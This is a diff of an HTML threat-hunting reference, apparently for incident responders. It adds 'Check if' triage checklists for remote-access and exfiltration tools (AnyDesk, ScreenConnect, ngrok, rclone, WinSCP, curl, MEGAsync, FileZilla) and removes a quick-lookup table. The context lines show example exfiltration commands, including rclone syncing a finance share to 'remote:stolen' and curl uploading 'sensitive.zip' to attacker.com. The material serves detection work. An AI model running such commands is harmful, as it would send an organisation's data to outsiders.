         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1018/" target="_blank">T1018</a></span>
@@ -1593,6 +2010,15 @@ anydesk.exe --set-password &lt;password&gt;</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is AnyDesk installed on servers or domain controllers?</li>
+          <li>Is it running as a SYSTEM service? (persistent attacker access)</li>
+          <li>Was port 7070 observed inbound from an external IP?</li>
+          <li>Check C:\ProgramData\AnyDesk\ad.trace — who connected and when.</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1219/" target="_blank">T1219</a></span>
         <span class="sev sev--high">High</span>
@@ -1624,6 +2050,15 @@ anydesk.exe --set-password &lt;password&gt;</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is it installed on non-helpdesk systems (servers, DCs, file servers)?</li>
+          <li>Is the service named "ScreenConnect Client (&lt;hash&gt;)"? (attacker-deployed instance)</li>
+          <li>Is there outbound traffic to *.screenconnect.com from a production host?</li>
+          <li>Was it installed via PowerShell or dropped to %TEMP%?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1219/" target="_blank">T1219</a></span>
         <span class="sev sev--high">High</span>
@@ -1654,6 +2089,15 @@ anydesk.exe --set-password &lt;password&gt;</div>
             <span class="rflag">Often renamed — check tunnel config</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is ngrok.exe running on any production server or workstation?</li>
+          <li>Is there DNS resolution to *.ngrok.io or *.ngrok-free.app?</li>
+          <li>Is localhost being forwarded externally? (C2 channel through firewall)</li>
+          <li>Is it renamed? Check PE metadata and tunnel configuration file.</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1572/" target="_blank">T1572</a></span>
@@ -1694,6 +2138,15 @@ rclone sync \\server\finance remote:stolen --transfers 10</div>
             <span class="rflag">Large volume outbound transfers</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is rclone.exe present anywhere on the system? Treat as active exfil.</li>
+          <li>Does %APPDATA%\rclone\rclone.conf exist with cloud provider credentials?</li>
+          <li>Is there large-volume outbound traffic to MEGA, Google Drive, or S3?</li>
+          <li>Is it renamed? Check PE imports and look for rclone.conf alongside it.</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1567/" target="_blank">T1567</a></span>
@@ -1789,6 +2242,16 @@ HKCU\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\
           </ul>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is /ini=nul present in the command? (attacker suppressing registry evidence — HIGH confidence malicious)</li>
+          <li>Is /script= or /command= being used headlessly without a GUI?</li>
+          <li>Is WinSCP running on a server or DC without any IT business justification?</li>
+          <li>Is there outbound port 22 (SFTP) to an external IP not in approved list?</li>
+          <li>Check SRUM DB — large bytes-sent by winscp.exe quantifies exfil volume.</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a> / <a href="https://attack.mitre.org/techniques/T1567/" target="_blank">T1567</a></span>
         <span class="sev sev--critical">Critical</span>
@@ -1826,6 +2289,15 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is POST with -d @&lt;file&gt; present? (data file being exfiltrated to attacker server)</li>
+          <li>Is -o downloading an executable to disk?</li>
+          <li>Is -k present? (ignoring SSL — common in attacker-controlled infra)</li>
+          <li>Is the destination an external IP or non-business domain?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1105/" target="_blank">T1105</a> / <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a></span>
         <span class="sev sev--high">High</span>
@@ -1855,6 +2327,15 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
             <span class="rflag">MEGA login from corporate IPs</span>
           </div>
         </div>
+      </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is MEGAsync installed on servers or DCs without IT authorization?</li>
+          <li>Is there outbound traffic to *.mega.nz or MEGA API endpoints?</li>
+          <li>Is MEGAsync running as a startup item or Windows service?</li>
+          <li>Is it paired with Rclone? (double exfil to different cloud providers)</li>
+        </ul>
       </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1567/002/" target="_blank">T1567.002</a></span>
@@ -1886,49 +2367,20 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
           </div>
         </div>
       </div>
+      <div class="tool-section check-if-section">
+        <div class="tool-section__label">Check if</div>
+        <ul>
+          <li>Is FileZilla installed on servers outside of IT or developer use?</li>
+          <li>Is there outbound FTP (port 21) or FTPS (port 990) to an external host?</li>
+          <li>Does FileZilla.xml contain session credentials for external destinations?</li>
+        </ul>
+      </div>
       <div class="tool-card__footer">
         <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1048/" target="_blank">T1048</a></span>
         <span class="sev sev--high">High</span>
       </div>
     </div>
 
-  </div>
-
-  <!-- ══════════════════════════════════════════
-       QUICK LOOKUP TABLE
-  ══════════════════════════════════════════ -->
-  <div class="ql-section">
-    <h2>&gt; Quick Incident Lookup</h2>
-    <table class="ql-table">
-      <thead>
-        <tr><th>Executable</th><th>First Question to Ask</th></tr>
-      </thead>
-      <tbody>
-        <tr><td>powershell.exe</td><td>Is it encoded (-enc)? What's the parent process?</td></tr>
-        <tr><td>rundll32.exe</td><td>What DLL is it loading and from where?</td></tr>
-        <tr><td>regsvr32.exe</td><td>Is there a URL in the arguments?</td></tr>
-        <tr><td>mshta.exe</td><td>Is it loading from a URL or script?</td></tr>
-        <tr><td>wscript / cscript</td><td>What script is it running and where is it located?</td></tr>
-        <tr><td>msbuild.exe</td><td>Is it running outside a build pipeline? What user?</td></tr>
-        <tr><td>wmic.exe</td><td>Is it using /format:, process call create, or /node:?</td></tr>
-        <tr><td>schtasks.exe</td><td>Where does the task binary live? Is it on a remote host?</td></tr>
-        <tr><td>sc.exe</td><td>What's the binPath? Is it stopping security services?</td></tr>
-        <tr><td>vssadmin.exe</td><td>Is it deleting shadows? Treat as ransomware event.</td></tr>
-        <tr><td>fltMC.exe</td><td>Is it unloading a filter? Map filter name to security product.</td></tr>
-        <tr><td>esentutl.exe</td><td>Is it accessing NTDS.dit or a shadow copy path?</td></tr>
-        <tr><td>certutil.exe</td><td>Is it downloading a URL or decoding a file?</td></tr>
-        <tr><td>nltest.exe</td><td>What user ran it? Was it part of a recon chain?</td></tr>
-        <tr><td>cmdkey.exe</td><td>Was /list run? What followed it?</td></tr>
-        <tr><td>procdump.exe</td><td>Did it target lsass.exe? Where is the dump file?</td></tr>
-        <tr><td>PsExec</td><td>Is PSEXESVC on remote hosts? Check Event ID 7045.</td></tr>
-        <tr><td>Mimikatz</td><td>Check Sysmon Event 10 (lsass access) + DCSync Event 4662.</td></tr>
-        <tr><td>AnyDesk</td><td>Where is it installed? Is it a service? Check ad.trace log.</td></tr>
-        <tr><td>Rclone</td><td>Check rclone.conf for cloud credentials. What data was synced?</td></tr>
-        <tr><td>WinSCP</td><td>Check WinSCP.ini for sessions. Outbound port 22?</td></tr>
-        <tr><td>curl.exe</td><td>POST with -d @file? Download of .exe? External destination?</td></tr>
-        <tr><td>ngrok</td><td>DNS/connections to ngrok.io? Treat as active C2 tunnel.</td></tr>
-      </tbody>
-    </table>
   </div>
 
   <footer class="footer">
@@ -1983,6 +2435,14 @@ curl.exe -k -T sensitive.zip ftp://attacker.com/</div>
 
     search.addEventListener('input', update);
     update();
+
+    // Analyst panel toggle
+    const panel = document.getElementById('analystPanel');
+    document.getElementById('panelToggle').addEventListener('click', function() {
+      const collapsed = panel.classList.toggle('collapsed');
+      this.textContent = collapsed ? '+' : '−';
+      this.title = collapsed ? 'Expand panel' : 'Collapse panel';
+    });
 
     // Nav scroll
     window.addEventListener('scroll', () => {
